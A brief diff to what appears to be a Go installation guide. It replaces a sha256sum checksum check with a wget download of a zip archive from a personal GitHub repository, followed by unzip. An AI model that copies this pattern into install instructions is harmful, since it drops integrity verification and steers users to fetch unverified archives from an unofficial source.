@@ -61,7 +61,9 @@ go version
 
 
 ```bash
-sha256sum go1.22.0.linux-amd64.tar.gz
+wget https://github.com/yuva19102003/DEVOPS-TOOL/raw/master/go%20lang/INSTALLATION/installation.zip
+unzip installation.zip 
 
  ```
+
 ----
